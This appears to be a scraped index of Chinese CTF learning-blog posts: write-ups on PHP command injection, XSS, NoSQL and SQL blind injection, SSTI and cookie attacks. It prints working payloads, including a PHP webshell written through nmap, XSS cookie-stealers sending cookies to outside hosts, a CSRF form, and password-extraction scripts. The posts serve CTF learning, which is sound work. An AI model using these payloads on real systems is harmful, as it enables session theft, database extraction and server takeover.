\u0026#39;=\u0026#39; padding = chunk.count(\u0026#39;=\u0026#39;) chunk = chunk.replace(\u0026#39;=\u0026#39;, \u0026#39;A\u0026#39;) # 临时替换填充字符，用于解码 # 逐字节解码 b1 = reverse_base64[chunk[0]] \u0026lt;\u0026lt; 2 | reverse_base64[chunk[1]] \u0026gt;\u0026gt; 4 b2 = (reverse_base64[chunk[1]] \u0026amp; 0xF) \u0026lt;\u0026lt; 4 | reverse_base64[chunk[2]] \u0026gt;\u0026gt; 2 b3 = (reverse_base64[chunk[2]] \u0026amp; 0x3) \u0026lt;\u0026lt; 6 | reverse_base64[chunk[3]] decoded_bytes.extend([b1, b2, b3]) # 根据填充字符调整解码结果 if padding \u0026gt; 0: decoded_bytes = decoded_bytes[:-padding] return bytes(decoded_bytes) # 解密过程 def decrypt(encrypted): # Step 1: 逐字节异或还原 after_xor = xor_decrypt(encrypted) # Step 2: 使用自定义 Base64 表解码 decoded = custom_base64_decode(after_xor) return decoded.decode(\u0026#39;utf-8\u0026#39;) # 调用解密函数 try: decrypted = decrypt(encrypted) print(\u0026#34;解密结果:\u0026#34;, decrypted) except Exception as e: print(\u0026#34;解密失败:\u0026#34;, e) 运行得到flag\nsecret_of_inkey\r进入发现是小游戏\n可以玩出flag来（bushi）\n在WP中看到了一个有趣的解法 ：使用pyautogui来进行自动化脚本操作。\npyautogui（控制鼠标键盘）GitHub官方文档翻译\nPayautogui\rpayautogui是一个Python模块，可以以编程的方式控制键鼠 使用脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 import pyautogui import time from pywinauto.application import Application print(\u0026#34;脚本将在3秒后开始运行...\u0026#34;) time.sleep(3) start_x, start_y, end_x, end_y = 900, 210, 2080, 1390 grid = [] key = [] grid.append(565) key.append(\u0026#39;9fc82e15d9de6ef2\u0026#39;) # 初始化一个集合用于记录已访问的网格位置 visited = set() visited.add(565) while len(grid): current_grid = grid.pop() current_key = key.pop() grid_x = start_x + 38 * (current_grid % 31) + 5 grid_y = start_y + 38 * (current_grid // 31) + 16 pyautogui.click(grid_x, grid_y) time.sleep(0.3) pyautogui.typewrite(current_key + \u0026#39;\\n\u0026#39;) time.sleep(0.3) try: app = Application(backend=\u0026#34;uia\u0026#34;).connect(title=\u0026#34;Right!\u0026#34;) dialog = app.window(title=\u0026#34;Right!\u0026#34;) static_text = dialog.child_window(control_type=\u0026#34;Text\u0026#34;) text = static_text.window_text() except Exception as e: print(f\u0026#34;无法连接到窗口: {e}\u0026#34;) continue pyautogui.typewrite(\u0026#39;\\n\u0026#39;) print(text) if \u0026#39;true\u0026#39; in text.lower(): break if \u0026#39;nothing\u0026#39; in text.lower(): continue t = text.split(\u0026#39;\\n\u0026#39;) print(t) # 假设每一行都有足够的长度，添加异常处理以避免索引错误 for i in range(min(4, len(t))): try: new_key = t[i][-17:-1] new_grid = int(t[i][7:10]) if new_grid not in visited: key.append(new_key) grid.append(new_grid) visited.add(new_grid) # 标记为已访问 except (ValueError, IndexError) as e: print(f\u0026#34;解析第 {i} 行时出错: {e}\u0026#34;) continue print(\u0026#34;当前已访问的网格数量:\u0026#34;, len(visited)) print(\u0026#34;待处理的key:\u0026#34;, key) print(\u0026#34;待处理的grid:\u0026#34;, grid) 得到flag\n","date":"2025-06-01T10:28:21+08:00","image":"https://c.img.dasctf.com/LightPicture/2024/12/9d8f8773e21caf21.png","permalink":"https://Oight.github.io/p/dasctf/","title":"DASCTF"},{"content":"PHP RCE\r记录一道关于PHP函数漏洞利用的题目\r[题目在这里](https://buuoj.cn/challenges#[BUUCTF 2018]Online Tool)\n创建实例显示源代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } if(!isset($_GET[\u0026#39;host\u0026#39;])) { highlight_file(__FILE__); } else { $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\u0026#34;glzjin\u0026#34;. $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); echo \u0026#39;you are in sandbox \u0026#39;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34;.$host); } payload:\n1 ?host=\u0026#39; \u0026lt;?php eval($_POST[\u0026#34;hack\u0026#34;]);?\u0026gt; -oG hack.php \u0026#39; 这个payload的意思是上传一句话木马的同时，将 nmap 的扫描结果保存为 hack.php 文件以免蚁剑连接时返回内容为空。 最后蚁剑连接，在根目录下找到flag\n在这道题目中其他需要注意的是关于转义符的理解：\r上面提到escapeshellarg()函数会将 单引号进行利用或转义，然后再在两边加上引号引起来。 其转义的方式就是在前面加上一个\\。同样的，escapeshellcmd()也会在对特殊符号进行转义，即在其前面加上\n其目的是让程序认为单引号仅仅作为符号存在，而不作为指令的一部分。\n例如： 如果传入\n1 It\u0026#39;s a dog. 就可能导致多余的’使得程序报错。 而使用转义符之后：\n1 2 It\\\u0026#39;s a dog. #等于 \u0026#34;It\u0026#39;s a dog.\u0026#34; 这时会作为一个完整的字符串进行后续操作。\n记一道没有做出来的XSS攻击题目\r上一周在做题时了解到利用Cooike可以进行XSS攻击，这周就遇到一道XSS，具体是利用XSS通过更改Cooike获取管理员权限来得到flag\n题目在这里 [CISCN2019 华东北赛区 Web2 1](https://buuoj.cn/challenges#[CISCN2019 华东北赛区]Web2)\n一开始打开发现是一个非常正常的文章汇总页面，一时间以为走错地方了（）\n然后探索发现存在注册以及登录的功能。注册个admin，注册成功，说明这里似乎对用户名没有限制。\n发现存在上传文章和反馈两个功能，翻看WP得知，这里的上传文章功能存在XSS漏洞，可以在这里上传XSS攻击代码，然后通过上传反馈得到管理员的SESSID，进行SQL注入后得到flag\n我们得知这里存在一个admin.php,访问提示不是管理员无法查看（果然）\n于是我们尝试进行XSS攻击。发现这里还存在WAF，会将’’(‘’转义成”（”\n使用这个脚本\n1 2 3 4 5 6 7 8 in_str = \u0026#34;(function(){window.location.href=\u0026#39;http://xss.buuoj.cn/index.php?do=api\u0026amp;id=xpqwIP\u0026amp;keepsession=0\u0026amp;location=\u0026#39;+escape((function(){try{return document.location.href}catch(e){return\u0026#39;\u0026#39;}})())+\u0026#39;\u0026amp;toplocation=\u0026#39;+escape((function(){try{return top.location.href}catch(e){return\u0026#39;\u0026#39;}})())+\u0026#39;\u0026amp;cookie=\u0026#39;+escape((function(){try{return document.cookie}catch(e){return\u0026#39;\u0026#39;}})())+\u0026#39;\u0026amp;opener=\u0026#39;+escape((function(){try{return(window.opener\u0026amp;\u0026amp;window.opener.location.href)?window.opener.location.href:\u0026#39;\u0026#39;}catch(e){return\u0026#39;\u0026#39;}})());})();\u0026#34; output = \u0026#34;\u0026#34; for c in in_str: output += \u0026#34;\u0026amp;#\u0026#34; + str(ord(c)) print(\u0026#34;\u0026lt;svg\u0026gt;\u0026lt;script\u0026gt;eval\u0026amp;#40\u0026amp;#34\u0026#34; + output + \u0026#34;\u0026amp;#34\u0026amp;#41\u0026lt;/script\u0026gt;\u0026#34;) 生成payload后提交，得到url后进反馈\n输入得到的url（题目提示要把靶机域名改为web）接下来解决验证码问题，题目中给出substr(md5($str), 0, 6) === “cfde39”： 这是一个MD5弱比较，使用下面这个脚本来生成验证码\n1 2 3 4 5 6 7 8 9 10 11 12 13 import hashlib import random import string target = \u0026#34;cfde39\u0026#34; while True: # 生成一个随机字符串 (4 个字符) s = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=8)) hash_value = hashlib.md5(s.encode()).hexdigest()[:6] if hash_value == target: print(f\u0026#34;Found: {s}\u0026#34;) break 由于题目中提供的xss.buuoj.cn已经停止服务了，所以我们还要自己搭建一个用于接收反馈的平台\n项目地址：XSS数据接收平台（无SQL版）\n使用小皮面板来搭建这个平台，可惜的是搭建好后我的模板都神奇地消失了，一开始以为是Windows Defender的问题（虽然确实），但关掉之后还是没有js模板，导致平台一直没法用，只能止步于此了。\n如果顺利的话，可以截取到管理员的SESSID，从而成功登录到admin.php，然后用\n1 2 3 4 5 6 7 8 9 -2 union select 1,2,3# -2 union select 1,database(),user()# -2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ciscn\u0026#39;# -2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;# -2 union select 1,2,group_concat(flagg) from ciscn.flag# SQL联合查询得到flag\n这里记录一些常见的XSS攻击代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 plaintext (1)普通的XSS JavaScript注入 \u0026lt;SCRIPT SRC=http://3w.org/XSS/xss.js\u0026gt;\u0026lt;/SCRIPT\u0026gt; (2)IMG标签XSS使用JavaScript命令 \u0026lt;IMG SRC=http://3w.org/XSS/xss.js/\u0026gt; (3)IMG标签无分号无引号 \u0026lt;IMG SRC=javascript:alert(\u0026#39;XSS\u0026#39;)\u0026gt; (4)IMG标签大小写不敏感 \u0026lt;IMG SRC=JaVaScRiPt:alert(\u0026#39;XSS\u0026#39;)\u0026gt; (5)HTML编码(必须有分号) \u0026lt;IMG SRC=javascript:alert(\u0026#34;XSS\u0026#34;)\u0026gt; (6)修正缺陷IMG标签 \u0026lt;IMG \u0026#34;\u0026#34;\u0026#34;\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;)\u0026lt;/SCRIPT\u0026gt;\u0026#34;\u0026gt; (7)formCharCode标签(计算器) \u0026lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))\u0026gt; (8)UTF-8的Unicode编码(计算器) \u0026lt;IMG SRC=jav..省略..S\u0026#39;)\u0026gt; (9)7位的UTF-8的Unicode编码是没有分号的(计算器) \u0026lt;IMG SRC=jav..省略..S\u0026#39;)\u0026gt; (10)十六进制编码也是没有分号(计算器) \u0026lt;IMG SRC=\u0026amp;#x6A\u0026amp;#x61\u0026amp;#x76\u0026amp;#x61..省略..\u0026amp;#x58\u0026amp;#x53\u0026amp;#x53\u0026amp;#x27\u0026amp;#x29\u0026gt; (11)嵌入式标签,将Javascript分开 \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (12)嵌入式编码标签,将Javascript分开 \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (13)嵌入式换行符 \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (14)嵌入式回车 \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (15)嵌入式多行注入JavaScript,这是XSS极端的例子 \u0026lt;IMG SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt; (16)解决限制字符(要求同页面) \u0026lt;script\u0026gt;z=\u0026#39;document.\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;write(\u0026#34;\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;\u0026lt;script\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39; src=ht\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;tp://ww\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;w.shell\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;.net/1.\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;js\u0026gt;\u0026lt;/sc\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;ript\u0026gt;\u0026#34;)\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;eval_r(z)\u0026lt;/script\u0026gt; (17)空字符12-7-1 T00LS - Powered by Discuz! Board https://www.a.com/viewthread.php?action=printable\u0026amp;tid=15267 2/6perl -e \u0026#39;print \u0026#34;\u0026lt;IMG SRC=java\\0script:alert(\\\u0026#34;XSS\\\u0026#34;)\u0026gt;\u0026#34;;\u0026#39; \u0026gt; out (18)空字符2,空字符在国内基本没效果.因为没有地方可以利用 perl -e \u0026#39;print \u0026#34;\u0026lt;SCR\\0IPT\u0026gt;alert(\\\u0026#34;XSS\\\u0026#34;)\u0026lt;/SCR\\0IPT\u0026gt;\u0026#34;;\u0026#39; \u0026gt; out (19)Spaces和meta前的IMG标签 \u0026lt;IMG SRC=\u0026#34; javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (20)Non-alpha-non-digit XSS \u0026lt;SCRIPT/XSS SRC=\u0026#34;http://3w.org/XSS/xss.js\u0026#34;\u0026gt;\u0026lt;/SCRIPT\u0026gt; (21)Non-alpha-non-digit XSS to 2 \u0026lt;BODY onload!#$%\u0026amp;()*~+-_.,:;?@[/|\\]^`=alert(\u0026#34;XSS\u0026#34;)\u0026gt; (22)Non-alpha-non-digit XSS to 3 \u0026lt;SCRIPT/SRC=\u0026#34;http://3w.org/XSS/xss.js\u0026#34;\u0026gt;\u0026lt;/SCRIPT\u0026gt; (23)双开括号 \u0026lt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;);//\u0026lt;\u0026lt;/SCRIPT\u0026gt; (24)无结束脚本标记(仅火狐等浏览器) \u0026lt;SCRIPT SRC=http://3w.org/XSS/xss.js?\u0026lt;B\u0026gt; (25)无结束脚本标记2 \u0026lt;SCRIPT SRC=//3w.org/XSS/xss.js\u0026gt; (26)半开的HTML/JavaScript XSS \u0026lt;IMG SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34; (27)双开角括号 \u0026lt;iframe src=http://3w.org/XSS.html \u0026lt; (28)无单引号 双引号 分号 \u0026lt;SCRIPT\u0026gt;a=/XSS/alert(a.source)\u0026lt;/SCRIPT\u0026gt; (29)换码过滤的JavaScript \\\u0026#34;;alert(\u0026#39;XSS\u0026#39;);// (30)结束Title标签 \u0026lt;/TITLE\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;);\u0026lt;/SCRIPT\u0026gt; 更多XSS攻击代码\n顺便贴上几篇参考的WP\nWP1\nWP2\nWP3\nWP4\nWP5\nXSS数据接收平台配置教程\n","date":"2025-06-01T10:28:06+08:00","permalink":"https://Oight.github.io/p/rcexss/","title":"RCE，XSS"},{"content":" NoSQL注入\r意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下\r什么是NoSQL？\rNoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。\n大多数遇到的NoSQL注入，其采用的数据库都是MongoDB。\n读这里详细了解MongoDB\nNoSQL 注入的分类\r有两种 NoSQL 注入分类的方式：\r第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。\n第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。\n1 重言式注入 又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。\n1 联合查询注入 联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。\n1 JavaScript 注入 MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。\n1 盲注 当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。\n常见的NoSQL为PHP中的NoSQL和Node.js中的NoSQL\nPHP 中的NoSQL注入\r重言式注入：\n重言式注入通常也是判断是否为NoSQL的第一步。 我们需要用$ne关键字构造永真条件来完成NoSQL注入\n1 username[$ne]=1\u0026amp;password[$ne]=1 最后如果数据库没有进行任何过滤的话，这里就会输出所有的用户名和用户密码 这里的原理是，$ne关键字在MongoDB查询语句中意思是不等于，也就是说我们上传了一个永真条件，使得登陆成功，但是服务端查不到username是1，password也是1的账户，只能输出所有的账户\n所以我们也可以使用以下的payload：\n1 2 3 username[$ne]=\u0026amp;password[$ne]= username[$gt]=\u0026amp;password[$gt]= username[$gte]=\u0026amp;password[$gte]= JavaScript注入：\nMongoDB Server 是支持 JavaScript 的，可以使用 JavaScript 进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的 JavaScript 代码，导致非法的数据获取或篡改。\n要想使用JS注入，我们需要了解一下$where操作符。\n在MongoDB中，可以通过$where操作符直接执行JavaScript代码如下实例：\ndb.users.find({ $where: “function(){return(this.username == ‘whoami’)}” }) { “_id” : ObjectId(“60fa9c80257f18542b68c4b9”), “username” : “whoami”, “password” : “657260” }\n由于使用了 $where 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。\n某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 $userData 获取查询条件：\n1 db.users.find({ $where: \u0026#34;function(){return(this.username == $userData)}\u0026#34; }) 然后，攻击者可能会注入一种恶意的字符串如 ‘a’; sleep(5000) ，此时 MongoDB 执行的查询语句为：\n1 db.users.find({ $where: \u0026#34;function(){return(this.username == \u0026#39;a\u0026#39;; sleep(5000))}\u0026#34; }) 如果此时服务器有 5 秒钟的延迟则说明注入成功。 值得注意的是，在 MongoDB 2.4 之前，通过 $where 操作符使用map-reduce、group 命令可以访问到 Mongo Shell 中的全局函数和属性，如db，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。 在MongoDB 2.4 之后db访问不到了，但还是可以构造万能密码查出用户信息\n布尔盲注： 当页面没有回显的时候可以使用$regex正则表达式来进行盲注，$regex可以达到和传统SQL注入中substr()函数相同的功能。\n和传统SQL注入一样，在已知用户名的情况下，我们需要知道密码长度。可以使用\nusername=admin\u0026amp;password[$regex]=.[4] (“[]”中的数字可以更改来确定密码长度，如果[4]为真，[5]为假，则密码为4位)\nNode.js中的MongoDB注入\rNode.js中的MongoDB注入主要是重言式注入，通过构造永真式万能密码实现登录绕过 另外，如果过滤了$ne关键字可以使用Unicode编码绕过。 在这里贴一个布尔盲注用于爆密码的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 plaintext import requests import string password = \u0026#39;\u0026#39; url = \u0026#39;http://node4.buuoj.cn:27409/login.php\u0026#39; while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;]: # When the method is GET get_payload = \u0026#39;?username=admin\u0026amp;password[$regex]=^%s\u0026#39; % (password + c) # When the method is POST post_payload = { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password[$regex]\u0026#34;: \u0026#39;^\u0026#39; + password + c } # When the method is POST with JSON json_payload = \u0026#34;\u0026#34;\u0026#34;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:{\u0026#34;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078\u0026#34;:\u0026#34;^%s\u0026#34;}}\u0026#34;\u0026#34;\u0026#34; % (password + c) headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} r = requests.post(url=url, headers=headers, data=json_payload) # 简单发送 json #r = requests.post(url=url, data=post_payload) if \u0026#39;但没完全登录\u0026#39; in r.content.decode(): print(\u0026#34;[+] %s\u0026#34; % (password + c)) password += c # 输出: # [+] 4 # [+] 42 # [+] 422 # [+] 4227 # [+] 42276 # [+] 422766 # ...... # [+] 42276606202db06ad1f29ab6b4a1 # [+] 42276606202db06ad1f29ab6b4a13 # [+] 42276606202db06ad1f29ab6b4a130 # [+] 42276606202db06ad1f29ab6b4a1307 # [+] 42276606202db06ad1f29ab6b4a1307f 关于Linux中的管道符 |\r管道符在以前RCE的时候也见到过但是没有进行系统研究，最近刷题的时候又遇到了，所以在这里记录一下 使用|可以将两个命令分隔开来，同时管道符左边命令的输出可以作右边命令的输入 因此在遇到一些已经可以执行命令（比如Ping）的靶机上，通过|连接cat或find或grep命令来找到flag\nMD5\rMD5绕过真是五花八门，ffifdyop和129581926211651571912466741651878684928可用于SQL注入时语句经过MD5加密之后的绕过，其原理是：提交的字符串经过加密形成的16进制字符串转换成10进制数字后对应的asii表内容为：‘ or ‘ 6……。 另外，数组绕过还可以绕过if($_POST[‘param1’]!==$_POST[‘param2’]\u0026amp;\u0026amp;md5($_POST[‘param1’])===md5($_POST[‘param2’]))\nSQL布尔盲注\r第一次在题目中遇到布尔盲注，所以在这里记录一下 题目：\n[[CISCN2019 华北赛区 Day2 Web1]Hack World 1](https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day2 Web1]Hack World)\n我一开始怀疑是NoSQL（因为题目提示是SQL注入，PHP），结果尝试username[$ne]=1\u0026amp;password[$ne]=1发现已经被过滤了。遂尝试普通的SQL注入 输入*1’ or 1=1 –+和1;show databases();#*发现均被过滤，而输入1和2的时候登陆成功，输入3以上的数字以及字母都会报错（回显bool flase） 所以猜测这里需要布尔盲注，同时屏蔽了关键词 尝试Fuzz一下看看屏蔽了哪些关键词\n1 2 3 4 这里粘贴一些用于Fuzz的字典 https://github.com/Underwood12/FuzzDict 这是Fuzz教程 https://www.bilibili.com/video/BV1Zs42137tf 题目给库名和表名都是flag 所以用id=0^(ascii(substr((select(flag)from(flag)),1,1))\u0026gt;101) 来查询，由于当\u0026gt;102的时候报错，说明第一个字符就是102的ascii所对应的字符，也就是f 然后使用脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 plaintext import requests url = \u0026#34;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php\u0026#34; result = \u0026#34;\u0026#34; num = 0 # 用了来判断是不是flag已经拼完整了 for i in range(1, 60): if num == 1: break for j in range(32, 128): payload = \u0026#34;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\u0026#34; % (i, j) # print(str((i-1)*96+j-32)+\u0026#34;:~\u0026#34;+payload+\u0026#34;~\u0026#34;) data = { \u0026#34;id\u0026#34;: payload, } r = requests.post(url, data=data) r.encoding = r.apparent_encoding if \u0026#34;Hello\u0026#34; in r.text: x = chr(j) result += str(x) print(result) break if \u0026#34;}\u0026#34; in result: print(result) num = 1 break 得到flag\nSSTI\r做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下 题目在这：\n👉 [BJDCTF2020 题目链接](https://buuoj.cn/challenges#[BJDCTF2020]Cookie is so stable)\n1.SSTI\rSSTI是这道题所考察的知识点，所以写在最前面\n如何判断是SSTI\r众所周知，SSTI是利用服务器模板漏洞，在模板引擎中注入恶意代码来进行攻击。 所以我们可以通过输入一些特殊的“探针”，观察服务器响应的变化来判断是否存在SSTI 常见的SSTI探针：\n​ {{77}} # Jinja2, Nunjucks, Twig等 ${77} # JSP, Freemarker, Spring \u0026lt;%= 7 * 7 %\u0026gt; # EJS (Embedded JavaScript) #{7*7} # Thymeleaf\n我们可以在输入框、URL参数、HTTP头、Cookies等位置尝试输入这些探针。然后查看页面返回里有没有49，如果有49，说明这里执行成功了，则存在SSTI漏洞\n不同的模板中使用不同的注入格式\nJinja2 和 Twig: 使用 {{ }} Freemarker 和 Spring: 使用 ${ } EJS: 使用 \u0026lt;%= %\u0026gt; Thymeleaf: 使用 #{ } 有时候会对大括号之类的进行过滤，所以可以用Unicode进行绕过 👉 SSTI 利用的文章\n2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？\rCookie可以从以下方面入手 1.HttpOnly、Secure、SameSite 标志：如果Cookie没有设置这些标志，可能可以通过XSS攻击窃取Cookie。 2.弱JWT签名：如果JWT使用弱的对称加密密钥（如 secret）或无签名 (none algorithm)，可以直接伪造JWT。 3.客户端验证：CTF中常见的“role=guest”→“role=admin”权限提升。 4.会话固定 (Session Fixation)：如果你能控制Session ID，可能可以冒充管理员。\n这里详细写一下第一点和第二点\n一、HttpOnly、Secure、SameSite 标志 我们可以使用F12打开控制台，然后在应用程序 (Application)”→“存储 (Storage)”→“Cookies”中，检查Cookie的属性：\n1 2 3 HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。 Secure：如果未启用，可能会在HTTP而不是HTTPS上传输Cookie。 SameSite：如果为None，可能可用于CSRF攻击。 1. 利用 HttpOnly\r开启HttpOnly则禁止通过JavaScript访问Cookie 如果这里是关的，那就可以\n1 2 plaintext \u0026lt;script\u0026gt;fetch(\u0026#39;http://yourserver.com/steal?cookie=\u0026#39; + document.cookie);\u0026lt;/script\u0026gt; 通过钓鱼的方式来获取管理员的会话ID\n2. 利用未设置 Secure 的 Cookie\r使用Burp Suite或Wireshark进行抓包。 在HTTP请求中，寻找Cookie: PHPSESSID=xxxx。 如果会话ID出现在HTTP请求中，而不是HTTPS中，则可以劫持会话。 如果题目考察是中间人攻击 (MITM)，你可以使用Wireshark来捕获Cookie： 过滤器：http.cookie。 查找“Set-Cookie”或“Cookie”字段中的会话ID。\n3. 利用不安全的 SameSite 属性\r如果SameSite标志为None，则跨站请求可以携带会话ID。 这使得CSRF攻击成为可能。 在攻击者的网站（比如 http:/ /evil.com）上放置以下表单：\n1 2 3 4 5 plaintext \u0026lt;form action=\u0026#34;http ://victim.com/change_password.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#34;newpassword123\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt;document.forms[0].submit();\u0026lt;/script\u0026gt; 如果受害者访问evil. com，表单会在受害者的会话中自动提交。\n如果SameSite=None，浏览器会将受害者的会话ID (PHPSESSID) 自动携带到请求中，管理员的身份将被利用。\n","date":"2025-06-01T00:00:00Z","permalink":"https://Oight.github.io/p/nosql%E6%B3%A8%E5%85%A5/","title":"NoSQL注入"},{"content":" 以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。\r一、WEB学习目录\r工具篇：\rWEB的常用工具有： BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器） Hackerbar（浏览器插件，传参的好帮手） 蚁剑（连接工具） 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（） ### 拥有了入门的工具，就可以步入WEB的世界力（喜）\nWEB包括哪些内容：\r1.文件包含 2.文件上传\n","date":"2025-06-01T00:00:00Z","permalink":"https://Oight.github.io/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/","title":"从零开始的CTF探险！"}]